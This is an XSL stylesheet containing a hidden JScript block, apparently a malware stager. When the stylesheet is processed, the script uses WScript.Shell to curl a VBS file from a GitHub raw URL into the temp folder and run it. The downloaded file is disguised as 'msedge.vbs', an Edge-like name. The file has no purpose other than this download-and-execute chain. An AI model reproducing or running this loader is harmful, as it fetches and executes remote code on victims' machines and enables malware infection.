<?xml version='1.0'?> 
 <stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"  xmlns:user="unknown" version="1.0">
<output method="text"/>
<ms:script language="JScript" implements-prefix="user"> 
 <![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("curl https://raw.githubusercontent.com/Vicky-Syst/mofa/main/msedge.vbs -o %TEMP%\msedge.vbs && %TEMP%\msedge.vbs");
]]> 
 </ms:script>
</stylesheet>
